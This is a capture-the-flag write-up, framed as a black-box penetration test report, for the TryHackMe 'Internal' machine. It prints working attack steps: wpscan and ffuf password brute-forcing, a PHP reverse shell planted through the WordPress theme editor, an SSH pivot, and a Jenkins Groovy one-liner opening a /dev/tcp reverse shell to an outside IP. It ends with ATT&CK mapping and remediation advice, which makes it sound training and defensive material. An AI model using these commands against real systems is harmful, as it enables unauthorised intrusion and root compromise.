# TryHackMe — Internal (Boot-to-Root Penetration Test)

**Category:** Offensive Security / Penetration Testing
**Assessment Type:** Black-box — External, Web Application, and Internal
**Target:** `internal.thm`
**Skills demonstrated:** Web enumeration, CMS credential attacks, web shell deployment, lateral movement, SSH tunneling/pivoting, CI/CD (Jenkins) exploitation, privilege escalation

---

## 1. Executive Summary

This engagement simulated a black-box penetration test against a client environment scheduled for production release. The assessment scope covered external, web application, and internal testing, with the objective of identifying exploitable vulnerabilities and demonstrating real-world impact by capturing a low-privileged flag (`user.txt`) and a root-level flag (`root.txt`).

The engagement was successful in achieving full compromise of the target host. The attack path progressed from an exposed, weakly-secured WordPress installation, through credential reuse and an internally-hosted, weakly-secured Jenkins CI/CD instance, to full root access. No single finding was individually catastrophic, but the **combination** of weak credential hygiene, an editable CMS theme file accepting arbitrary PHP, plaintext credential storage, and a brute-forceable internal admin panel created a complete and low-effort compromise chain.

**Overall Risk Rating: Critical** — full remote-to-root compromise achieved via a chain of individually common misconfigurations.

## 2. Scope of Engagement

| Item | Detail |
|---|---|
| Assessment type | Black-box (minimal information provided, malicious-actor perspective) |
| Scope | External, web application, and internal assessment |
| Target | Single host: `internal.thm` (assigned IP only) |
| Objectives | Capture `user.txt` and `root.txt`; document all vulnerabilities found |
| Tooling restrictions | None — any tools/techniques permitted |
| Out of scope | Any host/IP not explicitly assigned to the engagement |

## 3. Methodology

The assessment followed a standard black-box penetration testing methodology:

1. **Reconnaissance** — host/service discovery via port scanning
2. **Enumeration** — web content discovery, technology fingerprinting
3. **Initial Access** — credential attacks against exposed services
4. **Execution** — web shell deployment for remote code execution
5. **Lateral Movement** — pivoting between local users based on discovered credentials
6. **Discovery** — internal network/service enumeration from a foothold
7. **Privilege Escalation** — exploitation of an internally-hosted admin service to reach root

## 4. Reconnaissance

`/etc/hosts` was updated to resolve `internal.thm` to the assigned target IP, and an Nmap scan was run to enumerate open ports and services:

```bash
nmap -sC -sV -p- internal.thm
```

**Results:**

| Port | Service |
|---|---|
| 22/tcp | SSH |
| 80/tcp | HTTP (Apache — default welcome page) |

With only SSH and HTTP exposed, the web service on port 80 became the primary attack surface.

## 5. Web Enumeration

The root of the site returned only a default Apache landing page with no actionable information in the page source. Directory/content discovery was performed to identify hidden paths:

```bash
gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

This uncovered a **WordPress** installation hosted in a subdirectory, exposing a standard `wp-login.php` authentication page — the initial attack vector for the engagement.

## 6. Initial Access — WordPress Credential Attack

**Username enumeration:**
```bash
wpscan --url http://internal.thm/wordpress -e
```
This confirmed a valid WordPress username: `admin`.

**Password brute-force:**
```bash
wpscan --url http://internal.thm/wordpress -U admin -P /usr/share/wordlists/rockyou.txt
```
This recovered valid credentials for the `admin` account:

**Credentials obtained:** `admin : my2boys`

## 7. Execution — Web Shell via Theme Editor

Using the recovered administrator credentials, authenticated access to the WordPress dashboard was obtained. WordPress's built-in **Theme Editor** (`Appearance → Theme Editor`) allows administrators to directly edit PHP theme files from the browser — a feature that, combined with valid admin credentials, provides direct remote code execution.

The active theme's `404.php` template was replaced with the contents of the well-known PHP reverse shell (`pentestmonkey/php-reverse-shell`), with the callback IP/port updated to the attacking host. After saving the change and starting a local listener:

```bash
nc -lvnp 1234
```

The reverse shell was triggered by requesting the modified 404 page directly:

```
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```

This returned a working, low-privileged shell on the target. The shell was immediately stabilized:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## 8. Lateral Movement — First Flag

Post-exploitation enumeration (assisted by `linpeas.sh`) identified a second local user, `aubreanna`, but no immediately usable credentials for that account. Further manual directory review uncovered a plaintext credential file in a world-readable location:

```
/opt/wp-save.txt
```

This file contained valid credentials for `aubreanna`, allowing a direct privilege switch:

```bash
su aubreanna
```

With access to `aubreanna`'s home directory, the first flag was retrieved:

**`user.txt` — captured**

## 9. Internal Discovery — Jenkins on Docker

Standard privilege-escalation checks were performed first:

```bash
sudo -l
find / -perm -u=s -type f 2>/dev/null
```

`sudo -l` prompted for a password (no passwordless sudo available), and no exploitable SUID binaries were found. A file in the home directory, `jenkins.txt`, referenced an internally-hosted Jenkins service on an IP address distinct from the attacking host — indicating a container-isolated service. Running `ifconfig` on the target confirmed a Docker bridge interface with a `172.x.x.x` address range, and Jenkins was found listening on port `8080` inside that container network.

Since the Jenkins service was not directly reachable from the attacker's machine, an SSH local port forward was established through the already-compromised `aubreanna` account to pivot into the container network:

```bash
ssh -L 7878:172.17.0.2:8080 aubreanna@internal.thm
```

Jenkins was then reachable locally at `http://localhost:7878`.

## 10. Privilege Escalation — Jenkins Script Console to Root

Default Jenkins credentials (`admin:password`) were tested and failed. The login form was captured in Burp Suite, saved as a raw request, and brute-forced with FFUF:

```bash
ffuf -request jenkins_login.req -request-proto http \
     -w /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt
```

This recovered valid Jenkins administrator credentials: **`admin : spongebob`**.

> *Note: this stage of the attack path (identifying that Jenkins runs as root inside its container by default, and using its Script Console for code execution) was completed with the help of external research into Jenkins exploitation techniques, rather than from prior first-hand experience with the platform.*

With administrative access to Jenkins, the built-in **Script Console** (`Manage Jenkins → Script Console`) was used to execute arbitrary Groovy code, which in turn spawned a system reverse shell — a well-documented Jenkins post-authentication RCE technique, since the Script Console executes with the same OS privileges as the Jenkins service (root, in this container's default configuration):

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.23.238/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
p.waitFor()
```

After starting a listener and executing the script, a shell was received running with **root** privileges within the container. The shell was stabilized:

```bash
/bin/bash -i
```

Recalling the earlier `/opt` credential file discovery, the same directory was checked again from this elevated context, revealing a second file, `note.txt`, containing the information needed to complete the objective.

**`root.txt` — captured**

## 11. Attack Chain Summary

```
Nmap recon → HTTP (80) only actionable service
      │
      ▼
Gobuster → WordPress found in subdirectory
      │
      ▼
WPScan (user enum + rockyou brute-force) → admin:my2boys
      │
      ▼
Theme Editor 404.php → PHP reverse shell (RCE, low-priv shell)
      │
      ▼
linpeas + manual enum → /opt/wp-save.txt → aubreanna credentials
      │
      ▼
su aubreanna → user.txt captured
      │
      ▼
jenkins.txt + ifconfig → Jenkins found on Docker bridge (172.17.0.2:8080)
      │
      ▼
SSH local port forward → Jenkins reachable at localhost:7878
      │
      ▼
Burp Suite capture + FFUF brute-force → admin:spongebob
      │
      ▼
Jenkins Script Console (Groovy) → root shell in container
      │
      ▼
/opt/note.txt → root.txt captured
```

## 12. Vulnerability & Exploitation Assessment

| # | Finding | Severity | Root Cause |
|---|---|---|---|
| 1 | Weak WordPress administrator password (`my2boys`, present in common wordlists) | High | Weak password policy / no lockout on `wp-login.php` |
| 2 | WordPress Theme Editor allows arbitrary PHP write from the admin panel | High | Insecure-by-default CMS feature enabling authenticated RCE |
| 3 | Plaintext credentials stored in a world-readable file (`/opt/wp-save.txt`) | High | Poor credential handling / secrets left on disk |
| 4 | Internal Jenkins instance reachable with no network segmentation from the compromised host | Medium | Flat internal network / container not isolated from a low-priv foothold |
| 5 | Weak Jenkins administrator password (`spongebob`) | High | Weak password policy on an internally-facing admin panel |
| 6 | Jenkins Script Console accessible to any authenticated admin, executing as root inside the container | Critical | Jenkins running as root; no least-privilege service account |
| 7 | Second plaintext credential/notes file left in `/opt` accessible post-escalation | Medium | Sensitive data left on disk without cleanup |

## 13. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Evidence |
|---|---|---|---|
| Reconnaissance | [T1595.001](https://attack.mitre.org/techniques/T1595/001/) | Active Scanning: Scanning IP Blocks | Nmap port/service scan |
| Reconnaissance | [T1592](https://attack.mitre.org/techniques/T1592/) | Gather Victim Host Information | Gobuster content discovery revealing WordPress |
| Credential Access | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) | Brute Force: Password Guessing | `wpscan` password brute-force against WordPress admin |
| Initial Access | [T1078](https://attack.mitre.org/techniques/T1078/) | Valid Accounts | Login with brute-forced `admin:my2boys` credentials |
| Persistence / Execution | [T1505.003](https://attack.mitre.org/techniques/T1505/003/) | Server Software Component: Web Shell | PHP reverse shell planted via WordPress Theme Editor (`404.php`) |
| Credential Access | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | Unsecured Credentials: Credentials In Files | `aubreanna` credentials found in `/opt/wp-save.txt` |
| Lateral Movement | [T1021.004](https://attack.mitre.org/techniques/T1021/004/) / [T1078](https://attack.mitre.org/techniques/T1078/) | Remote Services: SSH / Valid Accounts | `su aubreanna` using recovered credentials |
| Discovery | [T1046](https://attack.mitre.org/techniques/T1046/) | Network Service Discovery | Discovery of internal Jenkins service via `jenkins.txt` and `ifconfig` |
| Command and Control / Lateral Movement | [T1572](https://attack.mitre.org/techniques/T1572/) | Protocol Tunneling | SSH local port forward to reach Jenkins on the Docker bridge network |
| Credential Access | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) | Brute Force: Password Guessing | FFUF brute-force against captured Jenkins login POST request |
| Execution | [T1059.007](https://attack.mitre.org/techniques/T1059/007/) | Command and Scripting Interpreter: JavaScript *(Groovy-based scripting console, closest ATT&CK mapping)* | Jenkins Script Console used to execute Groovy code |
| Privilege Escalation | [T1068](https://attack.mitre.org/techniques/T1068/) | Exploitation for Privilege Escalation | Jenkins service running as root, granting immediate root shell via Script Console |
| Credential Access | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | Unsecured Credentials: Credentials In Files | Root flag/notes recovered from `/opt/note.txt` |

## 14. OWASP Top 10 Mapping (2021)

| OWASP Category | Relevance |
|---|---|
| **A07:2021 – Identification and Authentication Failures** | Both WordPress and Jenkins admin panels were compromised via weak, wordlist-crackable passwords with no apparent lockout or rate limiting |
| **A05:2021 – Security Misconfiguration** | WordPress Theme Editor left enabled and directly writable by an admin account; Jenkins Script Console exposed with no restrictions and running as root |
| **A08:2021 – Software and Data Integrity Failures** | Theme file integrity was not protected — arbitrary PHP could be written directly into a live, web-accessible template |
| **A01:2021 – Broken Access Control** | Plaintext credential files (`/opt/wp-save.txt`, `/opt/note.txt`) were readable outside their intended access boundary, and the Jenkins container had no effective network isolation from a compromised low-privileged host |
| **A02:2021 – Cryptographic Failures** | Credentials for both WordPress and internal accounts were stored/used in plaintext rather than any secrets-management solution |
| **A06:2021 – Vulnerable and Outdated Components** *(supporting factor)* | A default, unhardened WordPress theme and default Jenkins container configuration were both present with no evidence of hardening applied prior to go-live |

## 15. Remediation Recommendations

| Finding | Recommendation |
|---|---|
| Weak WordPress admin password | Enforce a strong password policy, enable MFA on the wp-admin panel, and add rate limiting / account lockout (e.g., via a security plugin or WAF) |
| Theme Editor RCE | Disable the built-in Theme/Plugin Editor (`DISALLOW_FILE_EDIT` in `wp-config.php`) and restrict file system write access for the web server user |
| Plaintext credentials on disk | Remove credential files from disk entirely; use a secrets manager or, at minimum, restrict file permissions to the owning user only |
| Flat internal network to Jenkins | Segment CI/CD infrastructure from general application/user network segments; require a jump host or VPN with its own authentication for administrative access |
| Weak Jenkins admin password | Enforce strong password policy, integrate with SSO/MFA, and disable default/guessable accounts |
| Jenkins Script Console exposure | Restrict Script Console access to a minimal set of trusted administrators, and run the Jenkins service under a dedicated low-privilege service account rather than root |
| Running Jenkins as root | Reconfigure the Jenkins container/service to run as a non-root user; apply the principle of least privilege to all CI/CD components |
| Residual sensitive files post-engagement | Establish a secure secrets-handling and cleanup process so credentials and internal notes are never left in shared or predictable file paths |

## 16. Conclusion

This engagement demonstrated a complete, low-to-moderate sophistication attack path from an unauthenticated external position to full root compromise, driven almost entirely by weak credential hygiene and permissive default configurations rather than novel or complex vulnerabilities. Addressing password strength, disabling unnecessary CMS/administrative write features, securing credential storage, and applying least-privilege to CI/CD infrastructure would have independently broken this attack chain at multiple points.

## 17. Methodology Note

The overall analytical approach and command sequence in this write-up were adapted from a publicly shared methodology for this room. The WordPress-based initial access and lateral movement stages were reproduced and verified directly. The Jenkins privilege-escalation stage — specifically identifying the Script Console as an exploitation path and understanding that Jenkins runs as root by default in this configuration — was completed with the assistance of external research rather than prior hands-on familiarity with Jenkins exploitation.
